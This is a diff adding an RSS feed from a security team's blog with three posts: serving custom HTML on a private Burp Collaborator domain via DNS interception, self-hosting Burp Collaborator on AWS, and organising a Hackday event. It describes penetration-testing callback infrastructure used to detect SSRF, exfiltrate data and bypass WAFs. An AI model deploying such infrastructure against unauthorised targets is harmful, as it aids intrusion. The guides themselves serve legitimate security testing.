@@ -1,0 +1,1047 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Team ROT Information Security</title>
+	<atom:link href="/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>Team ROT Information Security</description>
+	<lastBuildDate>Tue, 05 Jan 2021 07:13:29 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+
+<image>
+	<url>/wp-content/uploads/2020/08/cropped-ROT2-WHITE-BG.eps_-2-32x32.png</url>
+	<title>Team ROT Information Security</title>
+	<link>/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>Custom HTML on private collaborator domain</title>
+		<link>/1692/</link>
+		
+		<dc:creator><![CDATA[putsi]]></dc:creator>
+		<pubDate>Mon, 04 Nov 2019 20:52:46 +0000</pubDate>
+				<category><![CDATA[Guide]]></category>
+		<category><![CDATA[Informative]]></category>
+		<guid isPermaLink="false">/?p=1692</guid>
+
+					<description><![CDATA[Hosting a private Burp Collaborator on custom domain can be very handy. However it currently has some limitations, one of them being the hard-coded index page.
+It would be useful to be able to customize the web page. For example, the default page could instruct viewers how to contact the collaborator owner. Another example would be serving any additional payload files from the same domain.
+There are hackish ways to achieve it, but not all are working as intended so let’s take a look how not to do it and how to actually do it.]]></description>
+										<content:encoded><![CDATA[<div class="flex_column av_one_full  flex_column_div av-zero-column-padding first  avia-builder-el-0  avia-builder-el-no-sibling  " style='border-radius:0px; '><section class="av_textblock_section "  itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost" ><div class='avia_textblock  '   itemprop="text" ><h1>Serving custom HTML on private collaborator domain</h1>
+<h3><strong>Note: Portswigger has now added support for custom HTML so this blog post is not needed!</strong></h3>
+<h3><a href="https://portswigger.net/burp/documentation/collaborator/deploying#adding-custom-content-to-your-collaborator-server"><strong>https://portswigger.net/burp/documentation/collaborator/deploying#adding-custom-content-to-your-collaborator-server</strong></a></h3>
+<h3></h3>
+<p><img decoding="async" class="alignnone size-large wp-image-1699" src="/wp-content/uploads/2019/10/burpindex-1.png" alt="" width="1" height="1" srcset="/wp-content/uploads/2019/10/burpindex-1.png 2068w, /wp-content/uploads/2019/10/burpindex-1-300x118.png 300w, /wp-content/uploads/2019/10/burpindex-1-1030x405.png 1030w, /wp-content/uploads/2019/10/burpindex-1-80x80.png 80w, /wp-content/uploads/2019/10/burpindex-1-768x302.png 768w, /wp-content/uploads/2019/10/burpindex-1-1536x605.png 1536w, /wp-content/uploads/2019/10/burpindex-1-2048x806.png 2048w, /wp-content/uploads/2019/10/burpindex-1-36x36.png 36w, /wp-content/uploads/2019/10/burpindex-1-180x180.png 180w, /wp-content/uploads/2019/10/burpindex-1-1500x590.png 1500w, /wp-content/uploads/2019/10/burpindex-1-495x400.png 495w, /wp-content/uploads/2019/10/burpindex-1-260x185.png 260w, /wp-content/uploads/2019/10/burpindex-1-845x321.png 845w, /wp-content/uploads/2019/10/burpindex-1-710x375.png 710w, /wp-content/uploads/2019/10/burpindex-1-705x278.png 705w, /wp-content/uploads/2019/10/burpindex-1-1210x423.png 1210w" sizes="(max-width: 1px) 100vw, 1px" /><img decoding="async" class="alignnone size-large wp-image-1699" src="/wp-content/uploads/2019/10/burpindex-1-1030x405.png" alt="" width="1030" height="405" srcset="/wp-content/uploads/2019/10/burpindex-1-1030x405.png 1030w, /wp-content/uploads/2019/10/burpindex-1-300x118.png 300w, /wp-content/uploads/2019/10/burpindex-1-768x302.png 768w, /wp-content/uploads/2019/10/burpindex-1-1536x605.png 1536w, /wp-content/uploads/2019/10/burpindex-1-2048x806.png 2048w, /wp-content/uploads/2019/10/burpindex-1-1500x590.png 1500w, /wp-content/uploads/2019/10/burpindex-1-705x278.png 705w" sizes="(max-width: 1030px) 100vw, 1030px" /><br />
+Hosting a <a href="/2019/05/23/self-hosted-burp-collaborator-with-custom-domain/">private Burp Collaborator on custom domain</a> can be very handy. It allows you for example to bypass WAFs, to use it on closed networks, to use different port numbers, to appear more professional with branded domain and so on. However it currently has some limitations, one of them being the hard-coded index page. When the collaborator domain is accessed without using any actual collaborator subdomain, a generic web page like above will be shown to the user.<br />
+It would be useful to be able to customize this. For example, the default page could instruct viewers how to contact the collaborator owner. Another example would be serving any additional payload files from the same domain.<br />
+According to Portswigger support, there is a feature request for customizing it but currently there is no supported way to serve custom content. There are hackish ways to achieve it, but not all are working as intended so let&#8217;s take a look how not to do it and how to actually do it.</p>
+<h3>Wrong ways to implement</h3>
+<p>An easy way would be using Nginx or HAProxy between the user and collaborator and making it proxy HTTP-requests from collaborator subdomains to collaborator and proxy other subdomains to web server (or serve directly the custom content). This however will lose the user&#8217;s IP for HTTP-requests as the Nginx&#8217;s/HAProxy&#8217;s IP will be shown on all HTTP-request interactions in collaborator.<br />
+<img decoding="async" class="alignnone size-full wp-image-1719" src="/wp-content/uploads/2019/10/httpproxy.png" alt="" width="842" height="382" srcset="/wp-content/uploads/2019/10/httpproxy.png 842w, /wp-content/uploads/2019/10/httpproxy-300x136.png 300w, /wp-content/uploads/2019/10/httpproxy-768x348.png 768w, /wp-content/uploads/2019/10/httpproxy-705x320.png 705w" sizes="(max-width: 842px) 100vw, 842px" /><br />
+Another easy way would be using a DNS-proxy which points some specific subdomains to the web server and proxies DNS-queries for all other subdomains to the DNS-server in collaborator. This will lose the user&#8217;s IP for DNS-requests as the DNS-proxy&#8217;s IP will be shown on all DNS-request interactions in collaborator.<br />
+<img decoding="async" class="alignnone wp-image-1718 size-full" src="/wp-content/uploads/2019/10/dnsproxy.png" alt="" width="842" height="382" srcset="/wp-content/uploads/2019/10/dnsproxy.png 842w, /wp-content/uploads/2019/10/dnsproxy-300x136.png 300w, /wp-content/uploads/2019/10/dnsproxy-768x348.png 768w, /wp-content/uploads/2019/10/dnsproxy-705x320.png 705w" sizes="(max-width: 842px) 100vw, 842px" /></p>
+<h3>Working way to serve custom html</h3>
+<p>Well how can we do this without losing the original IP on DNS-request and HTTP-request? Linux kernel supports <a href="https://www.netfilter.org/projects/libnetfilter_queue/">Netfilter Queue</a> which provides an API for viewing, modifying and dropping packets directly from the Kernel Packet Filter queue. It can be used along with <a href="https://scapy.net/">Scapy</a> to transparently inspect DNS-queries and to return fake DNS-replies.<br />
+Basically we&#8217;ll need to make NFQueue intercept all packets to port 53/UDP (DNS), then parse the DNS-request inside the packet. Then we&#8217;ll need to check if the DNS-request is for A-record and what (sub-)domain is it asking for. This (sub-)domain will then be checked against a list of (sub-)domains (e.g. collab.fi and www.collab.fi). If it doesn&#8217;t match any (sub-)domain on the list, the packet will be passed back on the queue without any modifications. If it matches something on the white list, Scapy will be used to create a fake DNS-reply pointing towards our web server. This fake DNS-reply will then be sent back to the source and the original packet will be dropped. It&#8217;s not actually that hard to do and now there is a script for doing all that automatically!<br />
+There are still some limitations with this method, as it fakes the DNS-replies you&#8217;ll need to have two IPs. One IP is associated with your collaborator domain and another IP is associated with the web server that you want to serve the custom html with. You don&#8217;t need two different virtual machines, having two public IPs on single VM should be enough. Collaborator listening on the first IP and web server listening on the second IP. Please let me know if there is a way to make this work with a single IP!</p>
+<h3 id="tldr">How to do this automatically</h3>
+<p>If you installed your private collaborator using the <a href="/2019/05/23/self-hosted-burp-collaborator-with-custom-domain/">previous guide</a>, you should still have the <a href="https://github.com/putsi/privatecollaborator">privatecollaborator</a>-directory. Run <strong>git pull</strong> inside the directory and you should get the latest code including a new <a href="https://github.com/putsi/privatecollaborator/tree/master/extendburp">extendburp</a>-directory. The directory contains an installation script, systemd service and <a href="https://github.com/putsi/privatecollaborator/blob/master/extendburp/dnsmitm.py">dnsmitm.py</a>-script which implements the actual magic.<br />
+To install, simply open the <strong>extendburp</strong>-directory and run the following command: <strong> ./extend_burp.sh TARGET_IP COLLABORATOR_DOMAIN<br />
+</strong>The <strong>TARGET_IP</strong>-parameter should be IP of the web server that will serve the custom content and <strong>COLLABORATOR</strong><strong>_DOMAIN</strong>-parameter is your private burp collaborator domain.<br />
+After the script is done, your server should respond to DNS-queries in the following way thus redirecting the user to correct HTTP-destination:</p>
+<ul>
+<li>DNS-query for <strong>www.yourcustomdomain.com</strong> -&gt; Returns IP of the <strong>web server</strong>.</li>
+<li>DNS-query for <strong>yourcustomdomain.com</strong> -&gt; Returns IP of the <strong>web server</strong>.</li>
+<li>DNS-query for <strong>AnythingElseLikeCollaboratorId.yourcustomdomain.com</strong> -&gt; Returns IP of the <strong>Burp Collaborator</strong>.</li>
+</ul>
+<p>In case you want to redirect more subdomains to the web server, simply insert those in the <strong>dnsmitm.py</strong> script.<br />
+Over and out –<a href="https://twitter.com/putsi">putsi</a>.</p>
+</div></section></div>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Self-hosted Burp collaborator with custom domain</title>
+		<link>/self-hosted-burp-collaborator-with-custom-domain/</link>
+		
+		<dc:creator><![CDATA[putsi]]></dc:creator>
+		<pubDate>Thu, 23 May 2019 22:15:55 +0000</pubDate>
+				<category><![CDATA[Guide]]></category>
+		<category><![CDATA[Informative]]></category>
+		<guid isPermaLink="false">/?p=1558</guid>
+
+					<description><![CDATA[The Burp Suite Collaborator is a valuable tool for penetration testers and bug bounty hunters. It basically gives you unique subdomains and logs all interactions (DNS, HTTP(S), SMTP) towards the subdomain. This can be used for example to detect SSRF-vulnerabilities and exfiltrate data.
+Burp Suite Professional provides a collaborator service under the domain burpcollaborator.net and using it is usually fine. However on the rare occasions it can be blacklisted / blocked or otherwise unreachable from the target. Luckily, the Burp collaborator can also be self-hosted and set to use a whole custom domain.]]></description>
+										<content:encoded><![CDATA[<section class="av_textblock_section "  itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost" ><div class='avia_textblock  '   itemprop="text" ><h1>Self-hosted Burp collaborator for fun and profit</h1>
+<p><img decoding="async" class="size-full wp-image-1588 aligncenter" src="/wp-content/uploads/2019/05/Screenshot-from-2019-05-24-01-25-10.png" alt="" width="853" height="400" srcset="/wp-content/uploads/2019/05/Screenshot-from-2019-05-24-01-25-10.png 853w, /wp-content/uploads/2019/05/Screenshot-from-2019-05-24-01-25-10-300x141.png 300w, /wp-content/uploads/2019/05/Screenshot-from-2019-05-24-01-25-10-768x360.png 768w, /wp-content/uploads/2019/05/Screenshot-from-2019-05-24-01-25-10-705x331.png 705w" sizes="(max-width: 853px) 100vw, 853px" /><br />
+The <a href="https://portswigger.net/burp/documentation/collaborator">Burp Suite Collaborator</a> is a valuable tool for penetration testers and bug bounty hunters. It basically gives you unique subdomains and logs all interactions (DNS, HTTP(S), SMTP(S)) towards the subdomains. This can be used for example to detect SSRF-vulnerabilities and exfiltrate data.<br />
+Burp Suite Professional provides a collaborator service under the domain <a href="http://burpcollaborator.net/">burpcollaborator.net</a> and using it is usually fine. However on the rare occasions it can be blacklisted / blocked or otherwise unreachable from the target. Luckily, the Burp collaborator can also be self-hosted and set to use a whole custom domain.<br />
+This blog post guides how to set up <strong>private Burp Collaborator</strong> <strong>instance on</strong> <strong>Amazon AWS</strong> and how to configure it to use a whole domain with a free <a href="https://letsencrypt.org/">Let&#8217;s Encrypt</a> SSL-certificate.<br />
+<strong>Note:</strong> If you&#8217;d like to use DigitalOcean instead of AWS, <a href="https://github.com/putsi/privatecollaborator">the automation script</a> supports also that (with and without floating IP).<br />
+If you&#8217;d like to use some completely other IaaS-platform, make sure that the VM&#8217;s network interface IP matches the public IP and <a href="https://github.com/putsi/privatecollaborator">the script</a> should yet again work.</p>
+</div></section>
+<section class="av_textblock_section "  itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost" ><div class='avia_textblock  '   itemprop="text" ><h2>Step 1: Create AWS Instance and Elastic IP</h2>
+<p><strong>TL;DR:</strong> Create Ubuntu Server 18.04 instance and assign Elastic IP to it. Allow inbound SMTP(S), HTTP(S) and DNS from everywhere and ports 9090&#038;9443 from your own IP.<br />
+First we&#8217;ll need to create a virtual machine for the Collaborator. Log in to your AWS-account and follow the steps:</p>
+<ol>
+<li>First, lets create the virtual machine.</li>
+<li>Navigate to <a href="https://eu-north-1.console.aws.amazon.com/ec2/v2/home?region=eu-north-1#LaunchInstanceWizard:">Instance wizard</a> and select <strong>Ubuntu Server 18.04 LTS (HVM), SSD Volume Type.</strong></li>
+<li>Select <strong>t2.micro </strong>or <strong>t3.micro</strong> depending on which has the <a href="https://aws.amazon.com/free/?all-free-tier.sort-by=item.additionalFields.SortRank&#038;all-free-tier.sort-order=asc&#038;awsf.Free%20Tier%20Types=*all&#038;awsf.Free%20Tier%20Categories=productcategories%23compute">free tier eligible</a> tag on your AWS region. Then click <strong>Next: Configure Instance Details.</strong></li>
+<li>Uncheck <strong>T2/T3 Unlimited</strong> as it might cause some expenses and then click <strong>Next: Add Storage</strong>.</li>
+<li>Go with default size and click <strong>Review and Launch</strong>.</li>
+<li>Click <strong>Launch</strong>.</li>
+<li>Create a new keypair and download it and click <strong>Launch instances</strong>.</li>
+<li>Next, lets create <a href="https://aws.amazon.com/premiumsupport/knowledge-center/elastic-ip-charges/">free-tier eligible</a> Elastic IP. This allows us to always have a static IP which can be linked to AWS virtual machines. Its not required but it makes things easier if you need to re-create your virtual machine.</li>
+<li>Navigate to <a href="https://eu-north-1.console.aws.amazon.com/ec2/v2/home?region=eu-north-1#AllocateAddress:">Allocate new address</a> and click Allocate.</li>
+<li>Go back to the <a href="https://eu-north-1.console.aws.amazon.com/ec2/v2/home?region=eu-north-1#Addresses:sort=PublicIp">Elastic IP List</a>, right click your Elastic IP, and <strong>Associate Address</strong> to the virtual machine created in the previous steps.</li>
+<li>Next, go to <a href="https://eu-north-1.console.aws.amazon.com/ec2/v2/home?region=eu-north-1#Instances:sort=instanceId">Instances</a> and click your instance. On bottom of the page, click the <strong>Security Group</strong> and it should open.</li>
+<li>Create <strong>Inbound rules</strong> like in the image below. Use your own PC IP for the port <strong>9443</strong> and <strong>9090</strong> as you don&#8217;t want anyone else using your collaborator.</li>
+</ol>
+<p><img decoding="async" class="alignnone wp-image-1561 size-large" src="/wp-content/uploads/2019/05/ports-1030x435.png" alt="" width="1030" height="435" srcset="/wp-content/uploads/2019/05/ports-1030x435.png 1030w, /wp-content/uploads/2019/05/ports-300x127.png 300w, /wp-content/uploads/2019/05/ports-768x324.png 768w, /wp-content/uploads/2019/05/ports-705x298.png 705w, /wp-content/uploads/2019/05/ports.png 1128w" sizes="(max-width: 1030px) 100vw, 1030px" /></p>
+</div></section>
+<section class="av_textblock_section "  itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost" ><div class='avia_textblock  '   itemprop="text" ><h2>Step 2: Configure the collaborator domain</h2>
+<p>Next we&#8217;ll have to configure the domain to have the Elastic IP as nameserver. Most providers require two unique nameservers so we will use <strong>one.one.one.one</strong> as the second one. If your domain is registered on GoDaddy, <a href="#godaddy">see here</a> for GoDaddy-specific instructions, otherwise follow the steps below.</p>
+<ol>
+<li>First, find out hostname for your Elastic IP. You can for example use <a href="https://mxtoolbox.com/ReverseLookup.aspx">MxToolbox</a> and it should give you something like <strong>ec2-00-00-00-00.eu-north-1.compute.amazonaws.com</strong>.</li>
+<li>Next, add nameservers for your collaborator domain in domain registrar settings. Use hostname from the previous step as first nameserver and <strong>one.one.one.one </strong>as second nameserver:<br />
+<img decoding="async" class="alignnone size-full wp-image-1623" src="/wp-content/uploads/2019/05/collab-1.png" alt="" width="409" height="317" srcset="/wp-content/uploads/2019/05/collab-1.png 409w, /wp-content/uploads/2019/05/collab-1-300x233.png 300w" sizes="(max-width: 409px) 100vw, 409px" /></li>
+<li>Done! All DNS-queries towards your private collaborator domain should now end up in the Elastic IP.</li>
+</ol>
+<h4 id="godaddy">Instructions for domains registered in GoDaddy:</h4>
+<ol>
+<li>Go to <a href="https://dcc.godaddy.com/domains/">My Domains</a> on GoDaddy.</li>
+<li>Click the three black dots next to your collaborator domain and then click <strong>Manage DNS</strong>.</li>
+<li>In <strong>Advanced Features </strong>section click the <strong>Host names</strong>.</li>
+<li>Add <strong>ns</strong>-host with your Elastic IP:<br />
+<img decoding="async" class="alignnone wp-image-1626" src="/wp-content/uploads/2019/05/godhn-1030x422.png" alt="" width="769" height="315" data-wp-editing="1" srcset="/wp-content/uploads/2019/05/godhn-1030x422.png 1030w, /wp-content/uploads/2019/05/godhn-300x123.png 300w, /wp-content/uploads/2019/05/godhn-768x315.png 768w, /wp-content/uploads/2019/05/godhn-705x289.png 705w, /wp-content/uploads/2019/05/godhn.png 1095w" sizes="(max-width: 769px) 100vw, 769px" /></li>
+<li>Next, modify the domain nameservers on the DNS Management page. Select <strong>Custom </strong>and set <strong>ns.YOUR_COLLABORATOR_DOMAIN </strong>as first one and <strong>one.one.one.one</strong> as second one:<br />
+<img decoding="async" class="alignnone wp-image-1625" src="/wp-content/uploads/2019/05/goddns.png" alt="" width="769" height="324" srcset="/wp-content/uploads/2019/05/goddns.png 999w, /wp-content/uploads/2019/05/goddns-300x126.png 300w, /wp-content/uploads/2019/05/goddns-768x324.png 768w, /wp-content/uploads/2019/05/goddns-705x297.png 705w" sizes="(max-width: 769px) 100vw, 769px" /></li>
+<li>Done! All DNS-queries towards your private collaborator domain should now end up in the Elastic IP.</li>
+</ol>
+</div></section>
+<section class="av_textblock_section "  itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost" ><div class='avia_textblock  '   itemprop="text" ><h2>Step 3: Configure the virtual machine</h2>
+<p>Next you&#8217;ll need to fetch Let&#8217;s encrypt certificate and configure the virtual machine and do some other stuff. There&#8217;s a <a href="https://github.com/putsi/privatecollaborator">script for it</a> so let&#8217;s use that. The script also implements automatic certificate renewal so you don&#8217;t have to manually renew the Let&#8217;s Encrypt every 90 days.</p>
+<ol>
+<li>First, use the keypair you downloaded to log in to the virtual machine:
+<ul>
+<li><strong>chmod 0600 newpair.pem</strong></li>
+<li><strong>ssh -i newpair.pem ubuntu@YOUR_ELASTIC_IP</strong></li>
+</ul>
+</li>
+<li>Clone the scripts:
+<ul>
+<li><strong>git clone https://github.com/putsi/privatecollaborator &amp;&amp; cd privatecollaborator</strong></li>
+</ul>
+</li>
+<li>Copy your Burp Suite Professional JAR-file to the <strong>privatecollaborator</strong>-directory.
+<ul>
+<li><strong>scp -i newpair.pem /your/own/pc/burp.jar ubuntu@YOUR_ELASTIC_IP:~/privatecollaborator/</strong></li>
+</ul>
+</li>
+<li>Run the installer script and place your domain as a command line parameter. The email is for Let&#8217;s Encrypt expiry notifications and can either be a valid one or a non-existing one:
+<ul>
+<li><strong>sudo ./install.sh collab.fi your@email.fi</strong></li>
+</ul>
+</li>
+<li>Accept any package installations that the script suggests and also enter your email address for Lets Encrypt notifications.</li>
+<li>Let&#8217;s Encrypt should now succeed creating a certificate for you. <strong>If it fails, you can try to run the install-script again couple of times.</strong> If it still fails, your domain DNS configuration from earlier steps most likely hasn&#8217;t refreshed yet. If that&#8217;s not the case, check your domain DNS configuration for typos and also check the security group inbound rules for port 53.</li>
+<li>You can now start the Burp collaborator service.
+<ul>
+<li><strong>sudo service burpcollaborator start</strong></li>
+</ul>
+</li>
+</ol>
+</div></section>
+<section class="av_textblock_section "  itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost" ><div class='avia_textblock  '   itemprop="text" ><h2>Step 4: Configure Burp Suite</h2>
+<p>If you didn&#8217;t do it already on previous step, start the private collaborator by running: <strong>sudo service burpcollaborator start</strong>. Then check logs with <strong>sudo systemctl status burpcollaborator</strong>. It should tell you about listening on various ports and should not show any errors.<br />
+Next start up your Burp Suite and open <strong>Project Options -> Misc</strong>. Set up the private collaborator config according to the below image, but using your own domain instead of collab.fi:<br />
+<img decoding="async" class="alignnone size-full wp-image-1575" src="/wp-content/uploads/2019/05/collab.png" alt="" width="635" height="270" srcset="/wp-content/uploads/2019/05/collab.png 635w, /wp-content/uploads/2019/05/collab-300x128.png 300w" sizes="(max-width: 635px) 100vw, 635px" /><br />
+Then click <strong>Run health check</strong> and wait for results. It should succeed on everything else than inbound SMTP (this is due to AWS policies):<br />
+<img decoding="async" class="alignnone size-full wp-image-1577" src="/wp-content/uploads/2019/05/health.png" alt="" width="849" height="330" srcset="/wp-content/uploads/2019/05/health.png 849w, /wp-content/uploads/2019/05/health-300x117.png 300w, /wp-content/uploads/2019/05/health-768x299.png 768w, /wp-content/uploads/2019/05/health-705x274.png 705w" sizes="(max-width: 849px) 100vw, 849px" /><br />
+If everything was OK, you should now be able to use the private collaborator instance normally on Burp Suite:<br />
+<img decoding="async" class="alignnone size-full wp-image-1618" src="/wp-content/uploads/2019/05/Untitled.png" alt="" width="1013" height="692" srcset="/wp-content/uploads/2019/05/Untitled.png 1013w, /wp-content/uploads/2019/05/Untitled-300x205.png 300w, /wp-content/uploads/2019/05/Untitled-768x525.png 768w, /wp-content/uploads/2019/05/Untitled-705x482.png 705w" sizes="(max-width: 1013px) 100vw, 1013px" /></p>
+</div></section>
+<section class="av_textblock_section "  itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost" ><div class='avia_textblock  '   itemprop="text" ><h2>Conclusions</h2>
+<p>We made it! It works!<br />
+Now you can for example add more non-standard ports to the configuration or do whatever else you might imagine.<br />
+In the future, this blog post will hopefully be updated on the subject of how to extend the Collaborator. <a href="https://github.com/putsi/privatecollaborator/issues">Potential subjects include</a>:</p>
+<ul>
+<li>Capturing interactions for protocols other than DNS, HTTP(S) and SMTP(S).</li>
+<li>Serving custom content as HTTP(S)-response.</li>
+<li>Dockerize the whole process.</li>
+<li>Run as a less-privileged user and properly set iptables redirections.</li>
+<li>Create a single-click setup for AWS.</li>
+<li>Something else? Let us know what you&#8217;d like to learn and we will see if we can help.</li>
+</ul>
+<p>Over and out &#8211;<a href="https://twitter.com/putsi">putsi</a>.</p>
+</div></section>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>How to create an awesome Hackday event</title>
+		<link>/how-to-create-an-awesome-hackday-event/</link>
+		
+		<dc:creator><![CDATA[jvesiluoma]]></dc:creator>
+		<pubDate>Mon, 20 May 2019 19:03:36 +0000</pubDate>
+				<category><![CDATA[Guide]]></category>
+		<category><![CDATA[Informative]]></category>
+		<guid isPermaLink="false">/?p=1550</guid>
+
+					<description><![CDATA[Hackday (not to be confused with ‘hackathon’ events) is a live event where a group or groups of hackers do security testing to some target (i.e. hack the target). Usually the target is a web application or for example some IoT device. The event may last from one day to a few days. It is common that the organizer will pay bounties for the security vulnerabilities reported by the participants. Organizer(s) can coax hackers to participate with some amazing swag, bounties or other prices that can be won in the event. Bigger the prices, the more hackers will want to join and more experienced hackers will be participating.
+
+
+
+
+The usual flow of the event will be; registering of participants, informational meetup to all, hacking and reporting of vulnerabilities, end meetup and some networking at the end.
+
+
+
+
+This document aims to guide organizers to create and amazing hacking event so everyone participating will have amazing time! Organizer will get the target tested for vulnerabilities and will get good PR from the event.]]></description>
+										<content:encoded><![CDATA[<h2><span style="font-weight: 400;">What is a Hackday?</span></h2>
+<p style="text-align: justify;"><span style="font-weight: 400;">Hackday (not to be confused with ‘hackathon’ events) is a live event where a group or groups of hackers do security testing to some target (i.e. hack the target). Usually the target is a web application or for example some IoT device. The event may last from one day to a few days. It is common that the organizer will pay bounties for the security vulnerabilities reported by the participants. Organizer(s) can coax hackers to participate with some amazing swag, bounties or other prices that can be won in the event. Bigger the prices, the more hackers will want to join and more experienced hackers will be participating.</span></p>
+<p style="text-align: justify;">
+<p style="text-align: justify;"><span style="font-weight: 400;">The usual flow of the event will be; registering of participants, informational meetup to all, hacking and reporting of vulnerabilities, end meetup and some networking at the end.</span></p>
+<p style="text-align: justify;">
+<p style="text-align: justify;"><span style="font-weight: 400;">This document aims to guide organizers to create and amazing hacking event so everyone participating will have amazing time! Organizer will get the target tested for vulnerabilities and will get good PR from the event.</span></p>
+<h2><span style="font-weight: 400;">Target(s)</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">If possible, use a testing/staging environment for the Hackday, with extended logging to catch more data in case errors occur (and to avoid causing trouble in Production).</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Permitting hackers to access the log data can help them to dig up issues that lie deep in the application.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Define the scope of the target in detail. This is hugely important for fair game and equal opportunity for all the teams. And also to safeguard production systems from being hammered.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Benchmark the system for heavy loads (e.g high amount of requests/queries). Testing can impact availability especially when multiple teams are trying to break it simultaneously.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">In some cases it can be beneficial to allow reconnaissance and testing prior to the event for more value from the event itself, at the risk of low volume of reports in the event itself.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Prepare user specific or at least team specific set of credentials for the target system. If the permission system is multi-tiered, create at least one user for each user role for each of the testers or teams. Two separate user accounts are necessary for testing certain issues.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Consider disabling or limiting the use of external security controls such as WAF (Web Application Firewalls) and/or IPS (Intrusion Prevention Systems). This allows the teams to spend time more efficiently on finding vulnerabilities rather than trying to bypass the controls, which can be bypassed by a motivated attacker in the production anyway.</span></li>
+</ul>
+<h2><span style="font-weight: 400;">Facilities</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Prepare a room for each of the teams. This will allow the testers to openly communicate about the application and potential vulnerabilities without having to worry about the competing team overhearing the strategy.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Connectivity options for wired and wireless networks in case one of the options is suffering poor availability.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Reserve some snacks, refreshing beverages and arrange a quick lunch/dinner depending on the length of the event.</span></li>
+</ul>
+<h2><span style="font-weight: 400;">Rewards</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">When announcing the event, include what kind of bounties will be available and if monetary, how much is reserved and how it will be paid out to the hackers. This will be the main attraction for many great hackers.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Explain how you’ll be paying the bounties, whether it is by vulnerability type or by points earned from reporting the vulnerabilities.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Preferably pay bounties based on business impact instead of vulnerability types. Bug Bounty programs are a great way to find the necessary details. </span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">If possible, reward each attending hacker/team regardless of their possible findings. This will help hackers cut their travel expenses and motivate them to to try harder next time. The reward can also be some kind of tech gift that is appealing to technically oriented people.</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Prepare the </span><b>Swag!</b><span style="font-weight: 400;"> (great publicity for the company)</span>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Stickers/T-Shirts/Hoodies/Backpacks/other</span></li>
+</ul>
+</li>
+</ul>
+<h2><span style="font-weight: 400;">Acknowledgement</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Give warm thanks to your friendly neighborhood hackers. They spend hours travelling to your event to help you secure the target system and to challenge themselves while doing so.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Don’t underestimate the public “thank you!”. Praise the teams in social media (or other), they will be grateful for it!</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Decide if the best finding/most vulnerabilities/most severe/etc vulnerability will be awarded somehow. This could also increase competitiveness between groups and at least give positive feeling of appreciation to winning group / person.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Engage in one on one conversations with the participants to establish rapport.</span></li>
+</ul>
+<h2><span style="font-weight: 400;"></span></h2>
+<h2><span style="font-weight: 400;">Rules and Reporting</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Non-Disclosure Agreement (reasonable terms).</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Rules</span>
+<ul>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Define what happens if a group breaks the rules, e.g. going out-of-scope, disturb other groups, unethical behaviour in the event etc. </span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Out-Of-Scope vulnerabilities should be accepted, but only as informational vulnerabilities in the event and without any points. More value for the money. </span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Malicious intent should be defined in the agreement. </span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Rules, non-disclosure agreements etc. documentation should preferably be sent beforehand for the participants to read.</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Remember to inform that participants can not share information about the vulnerabilities publicly (or they may lose the bounty for that vulnerability).</span></li>
+</ul>
+</li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">You should define what kind of vulnerability reports will </span><span style="font-weight: 400;">not</span><span style="font-weight: 400;"> be rewarded.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">When and how will bounties be paid.</span></li>
